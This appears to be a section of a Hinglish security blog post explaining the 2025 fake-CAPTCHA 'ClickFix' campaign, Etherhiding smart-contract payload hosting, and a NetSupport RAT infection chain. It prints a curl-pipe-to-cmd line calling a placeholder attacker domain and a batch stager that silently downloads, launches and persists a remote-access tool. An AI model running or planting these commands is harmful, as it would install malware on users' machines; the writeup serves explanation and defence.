## Attack Vector #3: Fake CAPTCHA / ClickFix — 58% of All Incidents

Yeh 2025 ka single highest-volume attack campaign tha. Aur yeh kaam karta hai kyunki yeh kuch aise exploit karta hai jo koi firewall block nahi kar sakta: **human habit**.

### Mechanism

Har kisi ne CAPTCHA click kiya hai. Yeh muscle memory hai. Attackers ne exactly usi reflex ke around ek attack build kiya.

**Flow kuch aisa hai:**

1. User ek legitimate website visit karta hai (usually ek compromised WordPress site)
2. Ek fake Cloudflare verification prompt appear hota hai
3. Page instruction deta hai: *"Win+R press karo, phir Ctrl+V — verify karo ki tum robot nahi ho"*
4. User comply karta hai — aur ek malicious PowerShell command run ho jaata hai jo clipboard mein pre-loaded tha
5. Payload silently deploy ho jaata hai

Windows Run dialog (`Win+R`) woh sab kuch execute kar sakta hai jiske liye current user ke paas permission hai — cmd, PowerShell, mshta, wscript. Yeh koi vulnerability nahi hai. Yeh ek **feature** hai. Aur use social engineering bridge ki tarah use kiya ja raha hai.

### Etherhiding: Blockchain Pe C2

Yahan 2025 technically interesting ho jaata hai.

Traditionally, attackers compromised websites pe malicious JavaScript host karte hain. Jab C2 server down hoti hai ya domain blocklist mein aata hai, campaign khatam. Toh attackers ne infrastructure problem blockchain se solve ki.

**Etherhiding kaise kaam karta hai:**

1. Attacker **Binance Smart Chain (BSC)** pe ek smart contract deploy karta hai
2. Compromised WordPress sites mein JavaScript inject hoti hai jo us contract ko `JSON-RPC eth_call` karti hai
3. Contract base64-encoded JavaScript return karta hai — actual malicious payload
4. Smart contract **takedown nahi ho sakta** — blockchain pe deploy hone ke baad immutable hai

Har infected site ka payload simultaneously change karna ho? Ek smart contract update karo. Thousands of compromised servers ko touch karne ki zaroorat nahi. Koi naya domain register karne ki zaroorat nahi.

Software architecture perspective se dekho toh — **yeh genuinely clever hai**. Decentralization as a resilience mechanism — except financial transactions ke liye nahi, malware delivery ke liye.

### NetSupport RAT — Actual Code

Ek incident mein yeh execution path kitna clean tha, dekho:

```bash
# Win+R dialog se ek curl command:
curl -s https://[attacker-domain]/stage.bat | cmd
```

```batch
@echo off
setlocal enabledelayedexpansion

:: Variables set karo
set URL=https://[attacker-domain]/client.zip
set DEST=%APPDATA%\Support\

:: Directory banao
mkdir %DEST%

:: PowerShell se ZIP download karo (hidden window)
powershell -WindowStyle Hidden -Command ^
  "Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%client.zip'"

:: .NET ZipFile class se extract karo
powershell -Command ^
  "Add-Type -Assembly System.IO.Compression.FileSystem; ^
   [IO.Compression.ZipFile]::ExtractToDirectory('%DEST%client.zip','%DEST%')"

:: NetSupport RAT launch karo
start "" "%DEST%client32.exe"

:: Registry Run key se persistence banao
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
  /v "Support11" /t REG_SZ /d "%DEST%client32.exe" /f
```

Developer ke liye teen observations:

1. **`%APPDATA%` se execution** — user-writable location, admin elevation nahi chahiye
2. **`.NET ZipFile` class** — legitimate Windows framework, external tool nahi
3. **`HKCU\...\Run` registry key** — admin rights nahi chahiye persistence ke liye

Yeh poora **Living-off-the-Land (LotL)** hai. Koi custom binary nahi. Har tool — `curl`, `powershell`, `reg`, `cmd` — Windows ke saath ship hota hai.

